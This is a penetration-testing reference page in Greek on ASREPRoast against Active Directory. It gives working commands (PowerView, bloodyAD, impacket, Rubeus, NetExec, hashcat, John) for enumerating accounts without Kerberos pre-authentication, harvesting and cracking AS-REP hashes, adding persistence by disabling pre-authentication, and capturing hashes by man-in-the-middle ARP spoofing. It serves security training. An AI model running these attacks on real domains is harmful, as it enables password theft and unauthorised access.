# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια security attack που εκμεταλλεύεται χρήστες οι οποίοι δεν έχουν το **Kerberos pre-authentication required attribute**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους attackers να ζητούν authentication για έναν χρήστη από τον Domain Controller (DC) χωρίς να χρειάζονται το password του χρήστη. Στη συνέχεια, ο DC απαντά με ένα μήνυμα κρυπτογραφημένο με το key που προέρχεται από το password του χρήστη, το οποίο οι attackers μπορούν να προσπαθήσουν να crack offline για να ανακαλύψουν το password του χρήστη.

Οι βασικές απαιτήσεις για αυτή την attack είναι:

- **Έλλειψη Kerberos pre-authentication**: Οι στοχευμένοι χρήστες δεν πρέπει να έχουν ενεργοποιημένο αυτό το security feature.
- **Σύνδεση με τον Domain Controller (DC)**: Οι attackers χρειάζονται πρόσβαση στον DC για να στέλνουν requests και να λαμβάνουν κρυπτογραφημένα μηνύματα.
- **Προαιρετικό domain account**: Η ύπαρξη ενός domain account επιτρέπει στους attackers να εντοπίζουν πιο αποτελεσματικά ευάλωτους χρήστες μέσω LDAP queries. Χωρίς τέτοιο account, οι attackers πρέπει να μαντέψουν usernames.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτηση AS_REP message
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Το Rubeus ζητάει **RC4** από προεπιλογή, οπότε το Event ID **4768** συνήθως δείχνει **preauth type 0** και **ticket encryption type 0x17**. Αν προσθέσεις **`/aes`** (ή αν το RC4 είναι απενεργοποιημένο για τον στόχο), περίμενε αντί για αυτό **AES etypes**.

#### Quick one-liners (Linux)

- Κάνε πρώτα enumerate πιθανούς στόχους (π.χ. από leaked build paths) με Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast μια ολόκληρη λίστα usernames χωρίς valid creds χρησιμοποιώντας NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Αν έχεις creds, άφησε το NetExec να κάνει query το LDAP και να ζητήσει κάθε roastable account για σένα: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Αν το output ξεκινά με **`$krb5asrep$23$`**, κάνε crack με Hashcat **`-m 18200`**. Αν ξεκινά με **`$krb5asrep$17$`** ή **`$krb5asrep$18$`**, προτίμησε John **`--format=krb5asrep`**.

### Cracking

Μην υποθέτεις ότι κάθε AS-REP roast είναι RC4. Τα σύγχρονα εργαλεία μπορούν να επιστρέψουν **RC4** (`$krb5asrep$23$`) ή **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) ανάλογα με το requested/negotiated enctype. Το **`hashcat -m 18200`** είναι για **etype 23**, ενώ το **John** χειρίζεται το `krb5asrep` απευθείας για **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Εξανάγκασε το **preauth** να μην απαιτείται για έναν χρήστη για τον οποίο έχεις δικαιώματα **GenericAll** (ή δικαιώματα για εγγραφή ιδιοτήτων):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast χωρίς credentials

Ένας attacker μπορεί να χρησιμοποιήσει μια θέση man-in-the-middle για να capture AS-REP packets καθώς διασχίζουν το network χωρίς να βασίζεται στο ότι το Kerberos pre-authentication είναι disabled. Επομένως, λειτουργεί για όλους τους users στο VLAN.\
Αν θέλεις το σχετικό no-credential trick που επιστρέφει ένα **service ticket** αντί για ένα **TGT** από ένα no-preauth principal, δες [Kerberoast](kerberoast.md).

Το [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε αυτό. Το `relay` mode είναι το ενδιαφέρον offensively γιατί μπορεί να force-άρει **RC4** όταν το client εξακολουθεί να advertises **etype 23**; το `listen` μένει passive και απλώς capture-άρει ό,τι negotiated ο client/DC.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
